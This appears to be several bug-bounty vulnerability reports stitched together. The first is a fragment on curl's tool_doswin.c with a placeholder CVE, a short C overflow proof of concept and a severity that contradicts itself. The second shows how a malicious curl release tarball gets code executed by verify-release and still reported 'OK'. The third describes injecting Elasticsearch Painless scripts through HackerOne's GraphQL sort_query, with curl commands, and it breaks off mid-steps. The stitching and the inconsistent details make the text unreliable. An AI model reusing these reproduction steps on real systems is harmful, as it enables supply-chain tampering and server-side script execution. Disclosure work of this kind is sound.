**Location**: Multiple functions in `tool_doswin.c`  
**Description**: String manipulation functions fail to properly null-terminate strings, leading to memory safety issues.

## Proof of Concept
```c
// Exploit for CVE-2024-XXXX-A
char malicious_path[PATH_MAX + 100] = "C:\\";
memset(malicious_path + 4, 'A', PATH_MAX + 96);
malicious_path[PATH_MAX + 99] = '\0';

char *sanitized;
sanitize_file_name(&sanitized, malicious_path, SANITIZE_ALLOW_PATH);
```

## Impact
- Potential heap corruption
- Denial of service
- Memory disclosure
- Possible code execution

## Recommendation
Add proper bounds checking for all path operations, implement input validation for path lengths, use safer string manipulation functions with explicit size parameters, and consider implementing a bounded string buffer abstraction.

**CVSS Score**: 7.5 (High)  
**Severity Classification**: Critical  

This vulnerability affects curl versions prior to the fix and impacts command-line applications that process user-supplied filenames.

## Impact

title: verify-release rebuilds from the tarball under verification, enabling pre-check command execution and false OK for a malicious curl release tarball

weakness.name: Reliance on Untrusted Inputs in a Security Decision

vulnerability_information:
## Summary:
`scripts/verify-release` is documented as a way to independently verify a downloaded curl release tarball, but on `curl-8.20.0` it extracts the tarball under verification and executes `./configure` and `./scripts/dmaketgz` before any trust decision is made.

This creates a circular trust failure: attacker-chosen commands from the tarball run in the verifier context before authenticity/integrity is established, and the same malicious tarball can still be reported as `curl-8.20.0.tar.gz: OK`.

Using a trusted verifier copied from the clean official tag `curl-8_20_0`, with the tarball as the only attacker-controlled input, I reproduced verifier-side attacker-chosen command execution from a malicious tarball built with curl’s own release tooling.

`strace -f -e execve` shows `execve("./configure", ...)` before `execve("/usr/bin/sha256sum", ["sha256sum", "-c", "checksum"], ...)`, while the final result is still `curl-8.20.0.tar.gz: OK`.

This is a source-package / distribution-integrity issue, not a generic infrastructure issue.

## Affected version
Confirmed affected: `8.20.0` source release (`curl-8_20_0` tag).

Likely affected: `8.10.0+`, because `verify-release` first shipped in `8.10.0`.

Platform used for reproduction:
`Linux kali 6.18.12+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.18.12-1kali1 (2026-02-25) x86_64 GNU/Linux`

## Steps To Reproduce:
1. Use a clean official curl repository checkout and extract the trusted verifier from the clean release tag:
   `git show curl-8_20_0:scripts/verify-release > trusted-verify-release && chmod +x trusted-verify-release`

2. Run the attached PoC `poc_verify_release_trust_failure.sh` against the clean repo.

3. The PoC downloads the official `curl-8.20.0.tar.gz`, confirms that the official tarball and the clean official tag do not contain the payload marker, injects a safe source-level payload into `configure.ac`, rebuilds a malicious tarball using the official `./scripts/dmaketgz`, and then runs the trusted verifier under `strace -f -e execve`.

4. Observe the decisive output:
   - `official_tar_has_payload=no`
   - `trusted_tag_has_payload=no`
   - `pre_auth_exec=yes`
   - `configure_execve=...execve("./configure", ["./configure", "--without-ssl", "--without-libpsl"], ...)`
   - `sha256sum_execve=...execve("/usr/bin/sha256sum", ["sha256sum", "-c", "checksum"], ...)`
   - `curl-8.20.0.tar.gz: OK`

5. Observe the proof file produced by the attacker-chosen payload:
   - `uid=1000 gid=1000 user=nobcoder`
   - `cwd=/tmp/.../curl-8.20.0`
   - `argv0=./configure`
   - `HOME=set`
   - `USER=set`
   - `SHELL=set`
   - `PATH=set`
   - `GNUPGHOME=unset`
   - `SSH_AUTH_SOCK=set`
   - `GITHUB_VAR_COUNT=0`

6. Observe that the malicious tarball accepted by the verifier had SHA-256:
   - `378a4c4de88b2cd55b6933faf1b61ba838130c754938226b4ed0f6716559678c`

I have attached:
- the stronger PoC,
- verifier log,
- `strace` exec-order log,
- proof file,
- and a ZIP bundle with all evidence.

## Impact

Impact:

## Summary:
An attacker who can cause a verifier to run curl’s documented `verify-release` workflow on a malicious release tarball can achieve verifier-side attacker-chosen local command execution before authenticity is established, while the trusted verifier still returns a false successful result (`curl-8.20.0.tar.gz: OK`).

This breaks the exact release-integrity property curl claims for `verify-release`: signatures prove origin, while `verify-release` is presented as the mechanism that should detect a release manager or release host adding extra malicious content to an official release. The current implementation cannot do that because it rebuilds from the tarball being verified.

I did not attempt to access or exfiltrate secrets. My proof only demonstrates execution-context visibility and false verification.

title: Authenticated Elasticsearch Painless script execution via Query.search.sort_query on hackerone.com/graphql
vulnerability_information:
**Summary:**
- The `sort_query: String` argument on `Query.search` (`hackerone.com/graphql`) is passed to the downstream Elasticsearch cluster as the raw value of the `sort` parameter, without server-side schema validation, keyword allowlisting, or rejection of scripted sort directives.

- I confirmed per-document Painless script execution by submitting two requests that differ only in the `script.source` field and observing that the script's return value determined document ordering. 

- The first request returned a constant sort key; the second read each document's internal `_seq_no` metadata field and returned it as the sort key. The result sets share zero overlapping documents in the first five positions, and the second request's ordering matches a known ascending-by-`_seq_no` baseline. This difference is only explainable by the Painless script compiling and executing per document against the `doc` context.

All testing was conducted against documents within my own authorization boundary (`NotificationsIndex`, scoped to my own notifications by a server-side user filter). The scripts I supplied did not read any user content, any foreign-tenant data, or any field beyond the `_seq_no` ES-internal metadata field.

**Description:**
- **URL:** `https://hackerone.com/graphql`
- **Method:** `POST`
- **GraphQL field:** `Query.search`
- **Argument:** `sort_query: String`
- **Index tested:** `NotificationsIndex`

The following additional surfaces expose the same `sort_query: String` argument and are likely to share the vulnerability, but were not tested:

- `Query.search` with other `IndexEnum` values (`DuplicateDetectorReportsIndex`, `OpportunitiesIndex`, `CompleteHacktivityReportIndex`, `StoredQueriesIndex`)
- `Organization.findings_search.sort_query: String`

## Steps To Reproduce

### Environment assumptions

All PoC commands assume the same browser session as the production frontend:

```bash
# /tmp/h1.headers contents:
#   accept: */*
#   content-type: application/json
#   origin: https://hackerone.com
#   referer: https://hackerone.com/notifications
#   user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
#   x-csrf-token: <session CSRF token>
#   x-product-area: notifications
#   x-product-feature: overview
#
# $COOKIE contains the full authenticated cookie jar including __Host-session and cf_clearance.
```

### Step 1 — Confirm session identity

```bash
curl -sk 'https://hackerone.com/graphql' -H @/tmp/h1.headers -b "$COOKIE" \
  --data-raw '{"query":"{me{_id username}}"}' | jq
```

**Response:**

```json
{"data":{"me":{"_id":"████████","username":"brumbelow"}}}
```

Reporter-level account with no elevated privileges.

### Step 2 — Confirm `sort_query` accepts raw Elasticsearch JSON

Before testing any scripting payload, I established that `sort_query` accepts arbitrary JSON sort specifications and that the sort takes effect on results.

```bash
# Field-based JSON sort — confirms JSON is parsed and sort is applied
```
